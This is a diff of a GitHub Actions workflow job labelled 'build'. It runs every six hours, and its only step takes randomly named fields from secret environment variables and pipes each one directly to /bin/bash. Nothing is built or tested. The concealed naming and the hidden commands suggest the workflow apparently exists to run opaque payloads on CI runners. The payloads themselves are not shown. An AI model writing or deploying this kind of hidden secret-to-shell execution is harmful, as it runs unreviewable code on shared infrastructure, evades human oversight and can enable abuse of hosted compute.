@@ -3,9 +3,8 @@ name: mengtianfeng9876
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 0/6 * * *'
-
-jobs:  # 14815
+    - cron: '2 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,18 +12,16 @@ jobs:  # 14815
       - uses: actions/checkout@v4
       - name: mengtianfeng9876
         env:
-          n652: ${{ secrets.n652 }}
+          vl4554: ${{ secrets.vl4554 }}
         run: |
-          echo $n652 | jq -r .ihktn00 | /bin/bash
-          echo $omap91435 | jq -r .gv59588 | /bin/bash
-          echo $pdyx3 | jq -r .ende79734 | /bin/bash
-          echo $bpiyy6115 | jq -r .q3 | /bin/bash
-          echo $qfw1202 | jq -r .sye7 | /bin/bash
-          echo $ckwd7285 | jq -r .ticj0 | /bin/bash
-          echo $nvu2 | jq -r .l1509 | /bin/bash
-          echo $sj5010 | jq -r .r140 | /bin/bash
-          echo $sn8 | jq -r .hnk29 | /bin/bash
-          echo $vpmyv9 | jq -r .xww764 | /bin/bash
-          echo $saazu36 | jq -r .tjhd3818 | /bin/bash
-          echo $st45824 | jq -r .yvm85402 | /bin/bash
+          echo $vl4554 | jq -r .hfyrk977 | /bin/bash
+          echo $awnin47293 | jq -r .ryovh863 | /bin/bash
+          echo $gbzfr40091 | jq -r .mmor37 | /bin/bash
+          echo $juaq9 | jq -r .kgl58 | /bin/bash
+          echo $lady205 | jq -r .hxsj7 | /bin/bash
+          echo $y7258 | jq -r .ll449 | /bin/bash
+          echo $bsh1 | jq -r .eoa7105 | /bin/bash
+          echo $mnfr6102 | jq -r .n9517 | /bin/bash
+          echo $vw8 | jq -r .yxxx14663 | /bin/bash
+          echo $ucha168 | jq -r .khvl39226 | /bin/bash
 
